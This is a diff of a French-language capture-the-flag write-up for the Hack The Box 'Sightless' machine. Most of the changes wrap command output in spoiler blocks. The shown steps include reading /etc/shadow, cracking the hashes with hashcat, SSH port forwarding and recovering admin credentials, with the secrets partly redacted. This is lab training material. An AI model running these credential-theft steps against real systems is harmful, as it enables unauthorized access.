@@ -28,6 +28,8 @@ nmap -T4 -A sightless.htb
 ```
 
 {% capture spoil %}
+
+```txt
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-14 15:21 CEST
 Nmap scan report for sightless.htb (10.10.11.32)
 Host is up (0.027s latency).
@@ -56,6 +58,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 70.56 seconds
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -97,6 +101,11 @@ Bien que nous soyons root sur la machine, il apparaît que nous sommes en réali
 
 ```bash
 ls -hal /
+```
+
+{% capture spoil %}
+
+```txt
 total 88K
 drwxr-xr-x   1 root root 4.0K Aug  2 09:30 .
 drwxr-xr-x   1 root root 4.0K Aug  2 09:30 ..
@@ -106,24 +115,43 @@ drwxr-xr-x   1 root root 4.0K Aug  2 09:30 ..
 [... expurgé pour brièveté ...]
 ```
 
+{% endcapture %}
+{% include elements/spoil.html %}
+
 Nous allons donc devoir trouver un moyen d'échapper à l'environnement, et atteindre le serveur qui fait tourner cet outil.
 
 En explorant le container, nous constatons qu'il existe un compte pour un utilisateur "michael". Nous pouvons récupérer le hash de son mot de passe ainsi que celui du compte root en lisant le fichier /etc/shadow
 
 ```bash
 cat /etc/shadow
+```
+
+{% capture spoil %}
+
+```txt
 root:$6$jn8fwk6LVJ9IYw30$qwtrfWTIT[... expurgé ...]0LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
 [... expurgé pour brièveté ...]
 michael:$6$mG3Cp2VPGY.FDE8u$KVWVI[... expurgé ...]aFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
 ```
 
+{% endcapture %}
+{% include elements/spoil.html %}
+
 Nous récupérons les hashes dans un fichier texte, et nous lançons {% include dictionary.html word="Hashcat" %} afin de récupérer les mots de passe.
 
 ```bash
 hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+{% capture spoil %}
+
+```txt
 root:$6$jn8fwk6LVJ9IYw30$qwtrfWTIT[... expurgé ...]0LGaepC3ch6Bb2z/lEpBM90Ra4b.:b[...expurgé...]e
 michael:$6$mG3Cp2VPGY.FDE8u$KVWVI[... expurgé ...]aFYuJa6DUh/pL2IJD/:i[...expurgé...]e
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Bien que la tentative de connexion au compte root soit infructueuse, nous sommes parvenu à nous connecter en {% include dictionary.html word="SSH" %} avec le mot de passe récupérer pour Michael
 
@@ -142,9 +170,17 @@ michael@sightless:~$
 Nous pouvons récupérer le flag user :
 
 ```bash
-cat user.txt 
+cat user.txt
+```
+
+{% capture spoil %}
+
+```txt
 bd6ac9[...expurgé...]b7e8ea
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ## Elevation de privilèges
 
@@ -154,12 +190,20 @@ En revanche, en listant les ports ouverts, nous constatons que le port 8080 est 
 
 ```bash
 netstat -tuln
+```
+
+{% capture spoil %}
+
+```txt
 Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State
 [... expurgé pour brièveté ...]
 tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN
 [... expurgé pour brièveté ...]
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Nous ouvrons donc une connexion {% include dictionary.html word="SSH" %} avec redirection de port pour pouvoir analyser le contenu.
 
@@ -175,11 +219,16 @@ En tentant d'exploiter une faille de Google Chrome / Chromium avec la commande `
 
 En cliquant sur "inspect" nous pouvons accéder aux outils d'analyse du réseau de Chromium où nous trouvons une page `index.php` qui contient en *payload* les données de connexions pour Froxlor :
 
+{% capture spoil %}
+
 ```txt
 loginname: admin
 password: For[... expurgé ...]Admin
 dologin:
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 Nous pouvons enfin accéder à l'outil :
 
@@ -205,6 +254,14 @@ Nous pouvons élever nos droits et devenir root. Ainsi nous pouvons récupérer 
 /bin/bash -p
 bash-5.1# id
 uid=1000(michael) gid=1000(michael) euid=0(root) groups=1000(michael)
-bash-5.1# cat /root/root.txt 
+bash-5.1# cat /root/root.txt
+```
+
+{% capture spoil %}
+
+```txt
 6c41fa[... expurgé ...]685ef4
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
